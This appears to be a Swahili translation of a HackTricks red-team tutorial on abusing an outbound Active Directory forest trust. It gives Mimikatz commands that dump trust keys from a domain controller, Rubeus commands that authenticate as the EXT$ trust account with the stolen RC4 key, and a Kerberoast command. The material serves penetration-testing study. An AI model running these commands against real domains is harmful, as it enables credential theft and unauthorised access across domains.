# Domainu ya Msitu wa Nje - Moja-Kuelekea (Kuelekea Nje)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Katika hali hii **domainu yako** ina **kuiamini** baadhi ya **madaraka** kwa mkuu kutoka **domainu tofauti**.

## Uchambuzi

### Uaminifu wa Kuelekea Nje
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Shambulizi la Akaunti ya Uaminifu

Kuna udhaifu wa usalama unapoanzishwa uhusiano wa uaminifu kati ya udomeni mbili, zilizotambulishwa hapa kama udomeni **A** na udomeni **B**, ambapo udomeni **B** unapanua uaminifu wake kwa udomeni **A**. Katika hali hii, akaunti maalum inaundwa katika udomeni **A** kwa ajili ya udomeni **B**, ambayo inacheza jukumu muhimu katika mchakato wa uwakiki kati ya udomeni hizo mbili. Akaunti hii, inayohusishwa na udomeni **B**, hutumiwa kwa kuficha tiketi za kupata huduma kote katika udomeni hizo.

Jambo muhimu la kuelewa hapa ni kwamba nenosiri na hash ya akaunti hii maalum inaweza kuchimbuliwa kutoka kwa Msimamizi wa Udomeni katika udomeni **A** kwa kutumia zana ya mstari wa amri. Amri ya kutekeleza hatua hii ni:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Uchimbaji huu ni wa kufanikiwa kwa sababu akaunti, iliyojulikana na **$** baada ya jina lake, iko hai na inamilikiwa na kikundi cha "Watumiaji wa Kikoa" cha kikoa **A**, hivyo kurithi ruhusa zinazohusiana na kikundi hiki. Hii inaruhusu watu kuthibitisha dhidi ya kikoa **A** kwa kutumia sifa za akaunti hii.

**Onyo:** Ni rahisi kutumia hali hii kupata msingi katika kikoa **A** kama mtumiaji, ingawa na ruhusa ndogo. Hata hivyo, ufikiaji huu ni wa kutosha kufanya uchambuzi wa kina kwenye kikoa **A**.

Katika hali ambapo `ext.local` ni kikoa kinachotegemewa na `root.local` ni kikoa kinachotegemewa, akaunti ya mtumiaji iitwayo `EXT$` itaundwa ndani ya `root.local`. Kupitia zana maalum, ni rahisi kudondosha funguo za uaminifu za Kerberos, kufunua sifa za `EXT$` katika `root.local`. Amri ya kufanikisha hili ni:
```bash
lsadump::trust /patch
```
Kufuatia hili, mtu anaweza kutumia funguo ya RC4 iliyochimbuliwa kujithibitisha kama `root.local\EXT$` ndani ya `root.local` kwa kutumia amri ya zana nyingine:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Hatua hii ya uthibitishaji inafungua uwezekano wa kuhesabu na hata kutumia huduma ndani ya `root.local`, kama vile kutekeleza shambulio la Kerberoast kuchimba maelezo ya akaunti ya huduma kwa kutumia:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Kukusanya nenosiri la uaminifu wazi

Katika mchakato uliopita, ilikuwa kutumika hash ya uaminifu badala ya **nenosiri wazi** (ambalo pia lilikuwa **limechimbuliwa na mimikatz**).

Nenosiri wazi linaweza kupatikana kwa kubadilisha pato la \[ CLEAR ] kutoka mimikatz kutoka hexadecimal na kuondoa herufi za sifuri ' \x00 ':

![](<../../.gitbook/assets/image (938).png>)

Maranyingi wakati wa kuunda uhusiano wa uaminifu, nenosiri lazima lipwe na mtumiaji kwa ajili ya uaminifu. Katika onyesho hili, ufunguo ni nenosiri la uaminifu la awali na kwa hivyo linaweza kusomwa na binadamu. Kwa kuwa ufunguo unabadilika (siku 30), nenosiri wazi haitasomwa na binadamu lakini kwa kiufundi bado linaweza kutumika.

Nenosiri wazi linaweza kutumika kufanya uwakiki wa kawaida kama akaunti ya uaminifu, njia mbadala ya kuomba TGT kwa kutumia ufunguo wa siri wa Kerberos wa akaunti ya uaminifu. Hapa, kuuliza root.local kutoka ext.local kwa wanachama wa Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## Marejeo

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka mwanzo hadi kuwa shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
